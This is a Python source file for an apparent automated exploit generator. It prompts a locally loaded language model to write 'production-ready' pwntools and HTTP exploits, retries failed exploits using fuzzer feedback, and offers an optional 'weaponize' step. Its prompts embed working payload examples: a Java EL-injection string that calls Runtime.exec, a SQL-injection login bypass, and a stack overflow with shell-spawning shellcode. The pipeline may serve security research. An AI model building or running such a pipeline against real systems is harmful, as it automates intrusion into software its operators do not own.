import torch
from transformers import AutoTokenizer, AutoModelForCausalLM, BitsAndBytesConfig
import logging
import os
import sys

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ml_engine.logger_config import setup_logger

logger = setup_logger(__name__, "scan_log.json")

class ExploitGenerator:
    def __init__(self, model_id=None, model=None, tokenizer=None, default_target=None):
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        self.default_target = default_target or "http://localhost"  # Use provided target or fallback to localhost
        
        # Model selection
        from ml_engine.model_config import get_model_config, DEFAULT_MODEL
        self.model_id = model_id if model_id else DEFAULT_MODEL
        
        if model is not None and tokenizer is not None:
            logger.info("Using provided shared model and tokenizer")
            self.model = model
            self.tokenizer = tokenizer
        else:
            config = get_model_config(self.model_id)
            model_path = config["base_path"]
            adapter_path = config.get("adapter_path_full")
            
            logger.info(f"Loading {config['name']} model from {model_path} on {self.device} (4-bit quantized)")
            try:
                import os
                self.tokenizer = AutoTokenizer.from_pretrained(model_path, trust_remote_code=True)
                
                # 4-bit Quantization Config
                quantization_config = BitsAndBytesConfig(
                    load_in_4bit=True,
                    bnb_4bit_compute_dtype=torch.float16,
                    bnb_4bit_quant_type="nf4",
                    bnb_4bit_use_double_quant=True,
                    llm_int8_enable_fp32_cpu_offload=True,
                )

                self.model = AutoModelForCausalLM.from_pretrained(
                    model_path, 
                    quantization_config=quantization_config,
                    device_map="auto",
                    trust_remote_code=True
                )
                
                # Apply LoRA adapter if specified
                if adapter_path and os.path.exists(adapter_path):
                    logger.info(f"Applying LoRA adapter from {adapter_path}...")
                    from peft import PeftModel
                    self.model = PeftModel.from_pretrained(self.model, adapter_path)
                    logger.info("LoRA adapter loaded successfully.")
                elif adapter_path:
                    logger.warning(f"Adapter path specified but not found: {adapter_path}")
                    
            except Exception as e:
                logger.error(f"Failed to load model: {e}")
                raise e


    def generate_exploit(self, vulnerability_details):
        """
        Generates an exploit script based on the provided vulnerability details.
        Uses an enhanced prompt with multi-stage reasoning.
        """
        logger.info("Generating exploit...")
        
        # Enhanced Alpaca Prompt with Detailed Reasoning
        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.

### Instruction:
You are an expert exploit developer and binary security researcher. Analyze the following vulnerability and generate a complete, production-ready Python exploit using the pwntools framework.

**Vulnerability Details:**
{vulnerability_details}

**Your Task:**
Generate a Python exploit script that follows this multi-stage reasoning process:

**Stage 1: Analysis**
- Determine the vulnerability type (buffer overflow, format string, use-after-free, etc.)
- Identify the target architecture (32-bit or 64-bit) from the address patterns
  * 32-bit addresses: typically 0x08xxxxxx or 0xffffxxxx (8 hex digits)
  * 64-bit addresses: typically 0x00007fxxxxxxxxxx or 0x0000xxxxxxxxxxxx (12-16 hex digits)
- Detect the service type (HTTP, FTP, raw TCP, etc.) from context clues
- Note any crash addresses (e.g., 0x41414141 indicates buffer overflow with 'A' characters)

**Stage 2: Exploit Construction**
1. **Use correct packing functions:**
   - Use `p32()` for 32-bit targets
   - Use `p64()` for 64-bit targets
   
2. **Calculate offsets:**
   - If the vulnerability mentions an offset, use it
   - If a crash address like 0x41414141 is present, calculate the cyclic pattern offset
   - Include a comment explaining the offset calculation
   
3. **Build the payload strategically:**
   - Padding to reach the return address
   - ROP gadgets (if applicable) or shellcode address
   - For stack-based exploits, include a NOP sled if using shellcode
   
4. **Protocol-aware delivery:**
   - For HTTP: Craft proper GET/POST requests with malicious headers/data
   - For raw TCP: Use direct socket send
   - For FTP: Use FTP commands (USER, PASS, etc.)
   
5. **Include exploitation techniques:**
   - Mention DEP/NX bypass strategies (ROP chains)
   - ASLR considerations (info leaks, partial overwrites)
   - Stack canaries (if detected, note bypass strategies)

**Stage 3: Verification**
- Add proper error handling
- Include interactive shell access via `target.interactive()`
- Add logging/debugging output

**Output Format:**
Provide ONLY the Python code wrapped in ```python``` tags. Include detailed comments explaining each section.

### Response:
```python
"""
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        
        with torch.no_grad():
            outputs = self.model.generate(
                **inputs, 
                max_new_tokens=4096,  # Increased for 100-200 line exploits
                temperature=0.2,      # Lower temperature for more focused output
                do_sample=True,
                top_p=0.9
            )
            
        generated_text = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # Extract code block - look for python code markers
        if "```python" in generated_text:
            exploit_code = generated_text.split("```python")[-1].split("```")[0].strip()
        elif "### Response:" in generated_text:
            # Fallback: extract everything after Response marker
            exploit_code = generated_text.split("### Response:")[-1].strip()
        else:
            exploit_code = generated_text
             
        return exploit_code

    def generate_exploit_enhanced(self, context, weaponize=True, weaponize_config=None):
        """
        Enhanced exploit generation with structured output.
        """
        logger.info("Generating enhanced exploit with context...")
        
        # Handle both dict and VulnerabilityContext
        if hasattr(context, 'to_dict'):
            context_dict = context.to_dict()
        else:
            context_dict = context
            
        # --- INTELLIGENCE UPGRADE: CWE-BASED ROUTING ---
        # Priority 1: CWE code (most reliable indicator)
        # Priority 2: File extension
        # Priority 3: Vulnerability type keywords
        
        file_path = context_dict.get("file_path", "").lower()
        vuln_type = context_dict.get("vulnerability_type", "").lower()
        cwe = context_dict.get("cwe", "").upper()
        
        # Define CWE categories
        WEB_APP_CWES = [
            "CWE-917",  # EL Injection
            "CWE-89",   # SQL Injection
            "CWE-79",   # XSS
            "CWE-78",   # Command Injection
            "CWE-22",   # Path Traversal
            "CWE-502",  # Deserialization
            "CWE-611",  # XXE
            "CWE-918",  # SSRF
            "CWE-90",   # LDAP Injection
            "CWE-643",  # XPath Injection
        ]
        
        BINARY_CWES = [
            "CWE-119",  # Buffer Overflow
            "CWE-120",  # Buffer Copy without Checking Size
            "CWE-121",  # Stack-based Buffer Overflow
            "CWE-122",  # Heap-based Buffer Overflow
            "CWE-787",  # Out-of-bounds Write
            "CWE-416",  # Use After Free
        ]
        
        WEB_EXTENSIONS = ['.java', '.php', '.py', '.js', '.jsp', '.asp', '.rb']
        BINARY_EXTENSIONS = ['.c', '.cpp', '.exe', '.bin', '.elf']
        
        # PRIORITY 1: CWE-based detection (highest priority)
        is_binary = False
        
        # Clean CWE for exact matching (e.g. "CWE-79: XSS" -> "CWE-79")
        cwe_clean = cwe.split(':')[0].strip().upper()
        
        if cwe_clean in WEB_APP_CWES:
            is_binary = False
            logger.info(f"Routing to WEB prompt based on CWE: {cwe_clean}")
        elif cwe_clean in BINARY_CWES:
            is_binary = True
            logger.info(f"Routing to BINARY prompt based on CWE: {cwe_clean}")
        # PRIORITY 2: File extension
        elif any(file_path.endswith(ext) for ext in WEB_EXTENSIONS):
            is_binary = False
            logger.info(f"Routing to WEB prompt based on extension: {file_path}")
        elif any(file_path.endswith(ext) for ext in BINARY_EXTENSIONS):
            # Only route to binary if BOTH extension AND vuln type match
            if any(term in vuln_type for term in ["buffer overflow", "segmentation fault", "memory corruption", "heap", "stack"]):
                is_binary = True
                logger.info(f"Routing to BINARY prompt based on extension+vulntype")
            else:
                is_binary = False
                logger.info(f"Binary extension but no binary vuln type - defaulting to WEB")
        else:
            # PRIORITY 3: Default to web for unknown cases
            is_binary = False
            logger.info(f"Unknown context - defaulting to WEB prompt")
        
        # 2. Route to the correct "Brain" (Prompt Strategy)
        if is_binary:
            prompt = self._build_binary_exploit_prompt(context_dict)
        else:
            prompt = self._build_web_logic_prompt(context_dict)

        
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        
        with torch.no_grad():
            outputs = self.model.generate(
                **inputs,
                max_new_tokens=4096, # Increased for 100-200 line exploits
                temperature=0.4,     # Lower temp for more logical/deterministic output
                do_sample=True,
                top_p=0.9,
                repetition_penalty=1.2 # Prevent loops
            )
        
        generated_text = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # Extract code logic - Robust method
        # 1. Isolate the response from the prompt
        if "### Response:" in generated_text:
            response_text = generated_text.split("### Response:")[-1].strip()
        else:
            response_text = generated_text
        
        # DEBUG: Log what the LLM actually generated
        logger.info(f"LLM Response (first 500 chars): {response_text[:500]}")
            
        # 2. Extract code block - ROBUST HANDLING
        exploit_code = ""
        
        # Case 1: Full code block with ```python ... ```
        if "```python" in response_text and response_text.count("```") >= 2:
            parts = response_text.split("```python")
            if len(parts) > 1:
                code_content = parts[-1]
                exploit_code = code_content.split("```")[0].strip()
        
        # Case 2: Only opening fence `` `python` (model stopped early)
        elif "```python" in response_text:
            logger.warning("LLM only generated opening code fence, extracting what follows...")
            exploit_code = response_text.split("```python")[-1].strip()
        
        # Case 3: Generic code fence without language
        elif "```" in response_text and response_text.count("```") >= 2:
             parts = response_text.split("```")
             if len(parts) >= 3:
                 exploit_code = parts[1].strip()
        
        # Case 4: No code fences - treat entire response as code
        else:
            logger.warning("No code fences found, treating entire response as code")
            exploit_code = response_text.strip()
            
        # Cleanup: Remove any lingering markdown or prompt artifacts
        if exploit_code.startswith("python"):
            exploit_code = exploit_code[6:].strip()
        
        # Check if extraction resulted in empty code
        if not exploit_code.strip():
            logger.warning("Exploit extraction resulted in empty code. Model may have generated malformed output.")
            # Enhance debug text
            debug_text = f"Input Prompt Length: {len(prompt)}\nRaw Response: {response_text[:1000]}..."
            logger.info(debug_text)
            
            return {
                "script": "",
                "payload": b"",
                "metadata": {
                    "architecture": context_dict.get("architecture"),
                    "protocol": context_dict.get("protocol"),
                    "cwe": context_dict.get("cwe"),
                    "weaponized": False
                },
                "success": False,
                "reason": "Extraction failed: Empty code block"
            }

        # Apply weaponization if requested
        if weaponize and weaponize_config:
            from ml_engine.exploit_weaponization import weaponize_exploit
            exploit_code = weaponize_exploit(exploit_code, weaponize_config)
        
        # Extract payload bytes
        payload_extractor = PayloadExtractor()
        raw_payload = payload_extractor.extract(exploit_code)
        
        return {
            "script": exploit_code,
            "payload": raw_payload,
            "metadata": {
                "architecture": context_dict.get("architecture"),
                "protocol": context_dict.get("protocol"),
                "cwe": context_dict.get("cwe"),
                "weaponized": weaponize
            },
            "success": True
        }

    def regenerate_exploit(self, previous_code, failure_reason, target_path=None, feedback=None):
        """
        Regenerates an exploit based on feedback from the Fuzzer/Validator.
        Used for the Self-Healing Loop and Intelligent Loop.
        """
        logger.info(f"Regenerating exploit due to failure: {failure_reason}")
        
        # CONTEXT AWARENESS: Detect if previous code was Web or Binary
        is_web = "requests" in previous_code or "http" in previous_code
        is_binary = "pwntools" in previous_code or "p32" in previous_code or "p64" in previous_code
        
        constraints = ""
        if is_web:
            constraints = """
**CRITICAL CONSTRAINTS:**
1. This is a WEB/HTTP exploit. DO NOT switch to binary exploitation tools like `pwntools`.
2. Keep using `requests`.
3. Focus on fixing the HTTP payload or logic.
"""
        elif is_binary:
             constraints = """
**CRITICAL CONSTRAINTS:**
1. This is a BINARY exploit. Keep using `pwntools`.
2. Focus on fixing the offset, padding, or ROP chain.
"""

        # --- INTELLIGENT LOOP: Path & Feedback Injection ---
        path_instruction = ""
        if target_path:
            path_instruction = f"**TARGET PATH:** The vulnerability is likely at `{target_path}`. Ensure the exploit targets this specific endpoint.\n"
            
        feedback_instruction = ""
        if feedback:
            feedback_instruction = f"**FUZZER FEEDBACK:** {feedback}\n"

        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.

### Instruction:
You are an expert exploit developer. A previous exploit attempt failed. 
Analyze the failed code and the error message, then rewrite the exploit to fix the issue.

**Failed Exploit Code:**
```python
{previous_code[:20000]}
```

**Failure Reason:**
{failure_reason}

{path_instruction}
{feedback_instruction}

**Analysis & Fix:**
1. If "Connection Refused": The port might be wrong, or the service crashed. Check the target IP/Port.
2. If "No Crash" (Binary): The payload size (offset) might be too small. INCREASE the padding size.
3. If "Syntax Error": Fix the Python syntax.
4. If "404 Not Found" (Web): The URL path might be wrong.
{constraints}

**Task:**
Rewrite the COMPLETE Python exploit script with the necessary fixes.

### Response:
{ "import requests" if is_web else "from pwn import *" }
"""
        inputs = self.tokenizer(prompt, return_tensors="pt").to(self.model.device)
        
        with torch.no_grad():
            outputs = self.model.generate(
                **inputs, 
                max_new_tokens=4096, # Increased for full exploit rewrites
                temperature=0.1, 
                do_sample=True,
                top_p=0.9,
                repetition_penalty=1.2
            )
            
        generated_text = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
        
        # Extract code logic - Robust method
        if "### Response:" in generated_text:
            response_text = generated_text.split("### Response:")[-1].strip()
        else:
            response_text = generated_text
            
        exploit_code = ""
        
        # Case 1: Full code block with ```python ... ```
        if "```python" in response_text and response_text.count("```") >= 2:
            parts = response_text.split("```python")
            if len(parts) > 1:
                code_content = parts[-1]
                exploit_code = code_content.split("```")[0].strip()
        
        # Case 2: Only opening fence (model stopped early)
        elif "```python" in response_text:
            exploit_code = response_text.split("```python")[-1].strip()
            
        # Case 3: Generic code fence
        elif "```" in response_text and response_text.count("```") >= 2:
             parts = response_text.split("```")
             if len(parts) >= 3:
                 exploit_code = parts[1].strip()
        
        # Case 4: No code fences
        else:
            exploit_code = response_text.strip()
            
        if exploit_code.startswith("python"):
            exploit_code = exploit_code[6:].strip()
            
        return exploit_code

    def _build_web_logic_prompt(self, context_dict):
        """
        Smart Logic Prompt for Web Vulnerabilities.
        Encourages Chain-of-Thought reasoning and provides complete few-shot examples.
        Now includes CVE-specific templates when available.
        """
        language = context_dict.get("language", "Java/Python")
        vuln_type = context_dict.get("vulnerability_type", "Unknown")
        cwe = context_dict.get("cwe", "Unknown")
        cve = context_dict.get("cve", "")  # NEW: Get CVE ID
        vulnerable_code = context_dict.get("vulnerable_chunk", "No code provided.")
        
        target_url = self.default_target or "http://localhost:8080"
        
        # NEW: Check for CVE-specific template
        cve_example = ""
        try:
            from ml_engine.exploit_templates import get_template_for_context, format_template_for_prompt
            
            template = get_template_for_context(cve=cve, cwe=cwe)
            if template:
                cve_example = format_template_for_prompt(template, target_url)
                logger.info(f"[CVE-AWARE] Using template for {template.cve_id} ({template.cwe})")
        except ImportError:
            logger.warning("exploit_templates.py not found, using generic examples")
        except Exception as e:
            logger.warning(f"Error loading CVE template: {e}")
        
        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.

### Instruction:
You are an expert Web Security Researcher. Your task is to analyze the provided code snippet and generate a production-ready Python exploit script.

**Vulnerability Context:**
- Type: {vuln_type}
- CWE: {cwe}
- CVE: {cve if cve else "Unknown"}
- Language: {language}
- Target URL: {target_url}

**Vulnerable Code:**
```
{vulnerable_code[:20000]}
```

**Your Task:**
1. **Analyze**: Explain WHY the code is vulnerable (Reasoning).
2. **Plan**: Determine the correct payload syntax for this specific language/framework.
3. **Exploit**: Generate a complete Python script using the `requests` library.

---
{cve_example if cve_example else '''
**EXAMPLE 1: EL Injection (CWE-917)**
*Vulnerable Code:* `factory.createValueExpression(context, input, String.class);`
*Reasoning:* User input is passed directly to EL expression evaluation.
*Exploit:*
```python
import requests

target = "http://localhost:8080/vuln"
# Payload: ${{7*7}} to test evaluation
payloads = [
    "${{7*7}}", 
    "${{''.getClass().forName('java.lang.Runtime').getMethod('exec',String.class).invoke(null,'id')}}"
]

for p in payloads:
    print(f"[*] Testing payload: {{p}}")
    r = requests.post(target, data={{"input": p}})
    if "49" in r.text or "uid=" in r.text:
        print(f"[+] VULNERABILITY CONFIRMED: {{p}}")
        print(r.text[:100])
        break
```

**EXAMPLE 2: SQL Injection (CWE-89)**
*Vulnerable Code:* `String query = "SELECT * FROM users WHERE name = '" + name + "'";`
*Reasoning:* String concatenation allows injecting SQL commands.
*Exploit:*
```python
import requests

target = "http://localhost:8080/login"
# Payload: ' OR '1'='1 to bypass auth
payload = "' OR '1'='1"

print(f"[*] Sending payload: {{payload}}")
r = requests.post(target, data={{"name": payload}})

if "Welcome" in r.text or r.status_code == 200:
    print("[+] SQL Injection Successful!")
else:
    print("[-] Failed.")
```
'''}
---

**REQUIREMENTS:**
1. Start with `import requests`.
2. Define the `target` variable.
3. Create a list of payloads appropriate for {cwe}.
4. Iterate through payloads and send requests.
5. Check the response for success indicators.
6. **DO NOT** use `pwntools` or binary exploitation techniques.
7. **DO NOT** stop mid-sentence. Provide the COMPLETE script.
8. **IMPORTANT**: If a CVE-specific example is provided above, follow its structure closely!

### Response:
**Reasoning:**
The code appears to be vulnerable to {vuln_type} because...
(Explain your reasoning here)

**Exploit Script:**
```python
import requests

target = "{target_url}"
"""
        return prompt


    def _build_binary_exploit_prompt(self, context_dict):
        """
        Enhanced Prompt for Binary/Memory Corruption Vulnerabilities (C/C++)
        Uses few-shot learning and architecture-aware instructions for perfect exploitation.
        """
        vuln_type = context_dict.get("vulnerability_type", "Buffer Overflow")
        arch = context_dict.get("architecture", "64-bit")
        crash_details = context_dict.get("crash_details", "SIGSEGV at 0x41414141")
        vulnerable_code = context_dict.get("vulnerable_chunk", "No code provided.")
        
        # INJECT TARGET INFO
        target_ip = "localhost"
        target_port = 1337
        if self.default_target:
             # Try to parse IP/Port from URL
             try:
                 from urllib.parse import urlparse
                 parsed = urlparse(self.default_target)
                 target_ip = parsed.hostname or "localhost"
                 target_port = parsed.port or 80
             except:
                 pass
        
        # Detect architecture from crash address
        arch_guidance = ""
        packing_func = "p64"
        if "architecture" in context_dict:
            if "32" in str(context_dict["architecture"]):
                arch = "32-bit"
                packing_func = "p32"
            elif "64" in str(context_dict["architecture"]):
                arch = "64-bit"
                packing_func = "p64"
        
        if "0x41414141" in str(crash_details) or any(addr.startswith("0x") and len(addr) == 10 for addr in str(crash_details).split()):
            arch = "32-bit"
            packing_func = "p32"
            arch_guidance = "✓ Detected 32-bit target (8-digit hex addresses)"
        elif any(addr.startswith("0x") and len(addr) > 12 for addr in str(crash_details).split()):
            arch = "64-bit"
            packing_func = "p64"
            arch_guidance = "✓  Detected 64-bit target (12+ digit hex addresses)"
        
        prompt = f"""Below is an instruction that describes a task. Write a response that appropriately completes the request.

### Instruction:
You are an elite Binary Exploitation Specialist. Your task is to generate a production-ready pwntools exploit for a memory corruption vulnerability.

**TARGET INFORMATION:**
- Vulnerability: {vuln_type}
- Architecture: {arch}
- Crash Details: {crash_details}
- Guidance: {arch_guidance}

**GOAL:**
Generate a Python script using `pwntools` that exploits this vulnerability.

**RESPONSE FORMAT:**
1. **Analysis**: Briefly analyze the crash and offset.
2. **Plan**: Outline the exploitation strategy (e.g., "Overwrite EIP with address of system()").
3. **Exploit Script**: The complete, runnable Python script.

**CRITICAL RULES:**
- Use `from pwn import *`
- Use `{packing_func}()` for packing addresses.
- DO NOT use `requests`.
- **DO NOT generate GDB logs, crash dumps, or simulated terminal output.**
- **Use Python 3 syntax ONLY (e.g., `print("msg")`, not `print "msg"`).**
- Include comments explaining the offset and payload structure.

**EXAMPLE (Buffer Overflow):**
**Analysis**: Crash at 0x41414141 indicates EIP control. Offset is 76 bytes.
**Plan**: 1. Create cyclic pattern. 2. Calculate offset. 3. Construct payload: Padding + EIP (JMP ESP) + Shellcode.
**Exploit Script**:
```python
from pwn import *

# Target
r = process('./vuln')

# Payload
offset = 76
shellcode = asm(shellcraft.sh())
payload = flat(
    b"A" * offset,
    0x080484cb,  # JMP ESP or similar gadget
    shellcode
)

r.sendline(payload)
r.interactive()
```

### Response:
"""
        return prompt

    def _get_exploit_library(self, language: str) -> str:
        """Get appropriate exploitation library for language"""
        libs = {
            "Python": "requests for HTTP, socket for TCP",
            "Java": "requests for HTTP, custom serialization",
            "JavaScript": "axios or fetch for HTTP",
            "PHP": "requests for HTTP",
            "Ruby": "Net::HTTP for HTTP"
        }
        return libs.get(language, "requests")


class PayloadExtractor:
    """Extract raw payload bytes from generated exploit scripts"""
    
    def extract(self, exploit_code: str) -> bytes:
        """
        Extract payload from exploit code.
        
        Looks for patterns like:
        - payload = b"A" * 140 + p64(0xdeadbeef)
        - target.send(payload)
        """
        import re
        
        # Try to find payload variable assignments
        payload_patterns = [
            r'payload\s*=\s*b["\'](.+?)["\']',  # Simple byte string
            r'payload\s*=\s*["\'](.+?)["\']',    # Regular string
            r'payload\s*[+]=\s*p(?:32|64)\((.+?)\)',  # Packed integers
        ]
        
        payload_bytes = b""
        
        # Look for repeated 'A' patterns (common padding)
        padding_match = re.search(r'["\']A["\']\s*\*\s*(\d+)', exploit_code)
        if padding_match:
            padding_size = int(padding_match.group(1))
            payload_bytes += b"A" * padding_size
        
        # Look for packed addresses
        p64_matches = re.findall(r'p64\((0x[0-9a-fA-F]+)\)', exploit_code)
        for addr_str in p64_matches:
            addr = int(addr_str, 16)
            payload_bytes += addr.to_bytes(8, byteorder='little')
        
        p32_matches = re.findall(r'p32\((0x[0-9a-fA-F]+)\)', exploit_code)
        for addr_str in p32_matches:
            addr = int(addr_str, 16)
            payload_bytes += addr.to_bytes(4, byteorder='little')
        
        # Fallback: generic 64-byte payload
        if not payload_bytes:
            payload_bytes = b"A" * 64
        
        logger.info(f"Extracted payload: {len(payload_bytes)} bytes")
        return payload_bytes


if __name__ == "__main__":

    # Note: This requires the actual model path to be valid and accessible.
    try:
        generator = ExploitGenerator()
        vuln = "Buffer overflow in 'login' function at offset 64."
        print(generator.generate_exploit(vuln))
    except Exception as e:
        print(f"Skipping test due to model load failure: {e}")
